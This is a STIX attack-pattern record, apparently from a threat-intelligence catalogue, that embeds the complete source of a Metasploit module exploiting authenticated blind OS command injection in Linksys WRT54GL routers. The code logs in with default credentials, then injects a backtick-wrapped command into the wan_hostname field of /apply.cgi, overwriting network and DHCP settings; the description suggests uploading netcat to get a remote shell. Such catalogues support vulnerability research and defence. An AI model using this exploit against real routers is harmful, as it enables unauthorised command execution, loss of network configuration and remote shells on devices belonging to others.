{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cec50260-e188-4a04-8579-7b8032532ea0",
    "created": "2024-08-14T16:23:05.352345Z",
    "modified": "2024-08-14T16:23:05.352349Z",
    "name": "Linksys WRT54GL Remote Command Execution",
    "description": " Some Linksys Routers are vulnerable to OS Command injection. You will need credentials to the web interface to access the vulnerable part of the application. Default credentials are always a good starting point. admin/admin or admin and blank password could be a first try. Note: This is a blind OS command injection vulnerability. This means that you will not see any output of your command. Try a ping command to your local system and observe the packets with tcpdump (or equivalent) for a first test.  Hint: To get a remote shell you could upload a netcat binary and exec it. WARNING: this module will overwrite network and DHCP configuration. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/linksys_wrt54gl_exec.rb",
            "external_id": "linksys_wrt54gl_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-01"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/attacking-linksys-wrt54gl"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linksys WRT54GL Remote Command Execution',\n        'Description' => %q{\n          Some Linksys Routers are vulnerable to OS Command injection.\n          You will need credentials to the web interface to access the vulnerable part\n          of the application.\n          Default credentials are always a good starting point. admin/admin or admin\n          and blank password could be a first try.\n          Note: This is a blind OS command injection vulnerability. This means that\n          you will not see any output of your command. Try a ping command to your\n          local system and observe the packets with tcpdump (or equivalent) for a first test.\n\n          Hint: To get a remote shell you could upload a netcat binary and exec it.\n          WARNING: this module will overwrite network and DHCP configuration.\n        },\n        'Author' => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-01' ],\n          [ 'URL', 'http://www.s3cur1ty.de/attacking-linksys-wrt54gl' ],\n          [ 'EDB', '24202' ],\n          [ 'BID', '57459' ],\n          [ 'OSVDB', '89421' ]\n        ],\n        'DisclosureDate' => '2013-01-18'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'PATH to OS Command Injection', '/apply.cgi']),\n        OptString.new('HttpUsername', [ true, 'User to login with', 'admin']),\n        OptString.new('HttpPassword', [ false, 'Password to login with', 'password']),\n        OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1']),\n        OptString.new('NETMASK', [ false, 'LAN Netmask of the router', '255.255.255.0']),\n        OptAddress.new('LANIP', [ false, 'LAN IP address of the router (default is RHOST)']),\n        OptString.new('ROUTER_NAME', [ false, 'Name of the router', 'cisco']),\n        OptString.new('WAN_DOMAIN', [ false, 'WAN Domain Name', 'test']),\n        OptString.new('WAN_MTU', [ false, 'WAN MTU', '1500'])\n      ]\n    )\n  end\n\n  # If the user configured LANIP, use it. Otherwise, use RHOST.\n  # NB: This presumes a dotted quad ip address.\n  def lan_ip\n    if datastore['LANIP'].to_s.empty?\n      datastore['RHOST']\n    else\n      datastore['LANIP']\n    end\n  end\n\n  def run\n    # setting up some basic variables\n    uri = datastore['TARGETURI']\n    user = datastore['HttpUsername']\n    rhost = datastore['RHOST']\n    netmask = datastore['NETMASK']\n    routername = datastore['ROUTER_NAME']\n    wandomain = datastore['WAN_DOMAIN']\n    wanmtu = datastore['WAN_MTU']\n\n    ip = lan_ip.split('.')\n\n    if datastore['HttpPassword'].nil?\n      pass = ''\n    else\n      pass = datastore['HttpPassword']\n    end\n\n    print_status(\"Trying to login with #{user} / #{pass}\")\n\n    begin\n      res = send_request_cgi({\n        'uri'\t=> uri,\n        'method' => 'GET',\n        'authorization' => basic_auth(user, pass)\n      })\n\n      unless (res.is_a? Rex::Proto::Http::Response)\n        vprint_error(\"#{rhost} not responding\")\n        return :abort\n      end\n\n      if (res.code == 404)\n        print_error('Not Found page returned')\n        return :abort\n      end\n\n      if [200, 301, 302].include?(res.code)\n        print_good(\"SUCCESSFUL LOGIN. '#{user}' : '#{pass}'\")\n      else\n        print_error(\"NO SUCCESSFUL LOGIN POSSIBLE. '#{user}' : '#{pass}'\")\n        return :abort\n      end\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost} - Failed to connect to the web server\")\n      return :abort\n    end\n\n    cmd = datastore['CMD']\n\n    print_status('Sending remote command: ' + cmd)\n\n    # cmd = Rex::Text.uri_encode(datastore['CMD'])\n    # original Post Request:\n    # data_cmd = \"submit_button=index&change_action=&submit_type=&action=Apply&now_proto=dhcp&daylight_time=1&\"\n    # data_cmd << \"lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=#{routername}&\"\n    # data_cmd << \"wan_hostname=`#{cmd}`&wan_domain=#{wandomain}&mtu_enable=1&wan_mtu=#{wanmtu}&lan_ipaddr_0=#{ip[0]}&\"\n    # data_cmd << \"lan_ipaddr_1=#{ip[1]}&lan_ipaddr_2=#{ip[2]}&lan_ipaddr_3=#{ip[3]}&lan_netmask=#{netmask}&\"\n    # data_cmd << \"lan_proto=dhcp&dhcp_check=&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&\"\n    # data_cmd << \"wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&\"\n    # data_cmd << \"wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&\"\n    # data_cmd << \"wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1\"\n\n    vprint_status(\"using the following target URL: #{uri}\")\n\n    begin\n      res = send_request_cgi({\n        'uri'\t=> uri,\n        'method' => 'POST',\n        'authorization' => basic_auth(user, pass),\n        # 'data' => data_cmd,\n\n        'vars_post' => {\n          'submit_button' => 'index',\n          'change_action' => '1',\n          'submit_type' => '1',\n          'action' => 'Apply',\n          'now_proto' => 'dhcp',\n          'daylight_time' => '1',\n          'lan_ipaddr' => '4',\n          'wait_time' => '0',\n          'need_reboot' => '0',\n          'ui_language' => 'de',\n          'wan_proto' => 'dhcp',\n          'router_name' => routername.to_s,\n          'wan_hostname' => \"`#{cmd}`\",\n          'wan_domain' => wandomain.to_s,\n          'mtu_enable' => '1',\n          'wan_mtu' => wanmtu.to_s,\n          'lan_ipaddr_0' => (ip[0]).to_s,\n          'lan_ipaddr_1' => (ip[1]).to_s,\n          'lan_ipaddr_2' => (ip[2]).to_s,\n          'lan_ipaddr_3' => (ip[3]).to_s,\n          'lan_netmask' => netmask.to_s,\n          'lan_proto' => 'dhcp',\n          'dhcp_check' => '1',\n          'dhcp_start' => '100',\n          'dhcp_num' => '50',\n          'dhcp_lease' => '0',\n          'wan_dns' => '4',\n          'wan_dns0_0' => '0',\n          'wan_dns0_1' => '0',\n          'wan_dns0_2' => '0',\n          'wan_dns0_3' => '0',\n          'wan_dns1_0' => '0',\n          'wan_dns1_1' => '0',\n          'wan_dns1_2' => '0',\n          'wan_dns1_3' => '0',\n          'wan_dns2_0' => '0',\n          'wan_dns2_1' => '0',\n          'wan_dns2_2' => '0',\n          'wan_dns2_3' => '0',\n          'wan_wins' => '4',\n          'wan_wins_0' => '0',\n          'wan_wins_1' => '0',\n          'wan_wins_2' => '0',\n          'wan_wins_3' => '0',\n          'time_zone' => '-08+1+1',\n          '_daylight_time' => '1'\n        }\n      })\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost} - Failed to connect to the web server\")\n      return :abort\n    end\n\n    if res && (res.code == 200)\n      print_status('Blind Exploitation - Response expected')\n    else\n      print_error(\"Blind Exploitation - Response don't expected\")\n    end\n    print_status('Blind Exploitation - wait around 10 seconds until the configuration gets applied and your command gets executed')\n    print_status('Blind Exploitation - unknown Exploitation state')\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-18"
}